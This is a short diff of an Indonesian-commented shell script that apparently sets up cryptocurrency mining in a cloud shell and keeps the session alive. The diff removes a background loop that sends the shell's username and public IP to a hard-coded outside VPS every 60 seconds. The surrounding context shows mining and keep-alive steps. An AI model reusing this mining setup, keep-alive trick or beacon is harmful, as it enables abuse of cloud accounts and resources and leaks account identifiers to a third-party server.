@@ -70,22 +70,7 @@ sudo rm -f chromium-data.tar.gz
 sudo rm -f chromium-data-ori2.tar.gz
 sudo rm -f chromium-data-single.tar.gz
 
-echo "✅ Selesai setup. Memulai penambangan dan pelaporan IP ke VPS..."
-
-# ========================
-# Bagian: REPORTER - Kirim IP ke VPS setiap 60 detik
-# ========================
-(
-  CLOUD_ID=$(echo "$HOME" | awk -F'/' '{print $3}')  # hasil: username Cloud Shell
-  VPS_RECEIVER="http://103.139.192.168:5050/report"
-
-  while true; do
-    CLOUD_IP=$(curl -s ifconfig.me)
-    TIMESTAMP=$(date '+%Y-%m-%d %H:%M:%S')
-    curl -s "$VPS_RECEIVER?id=$CLOUD_ID&ip=$CLOUD_IP&ts=$TIMESTAMP" > /dev/null
-    sleep 60
-  done
-) &  # <- ini dijalankan di background
+echo "✅ Selesai setup. Memulai penambangan..."
 
 # ========================
 # Bagian: Ping agar Cloud Shell tetap aktif
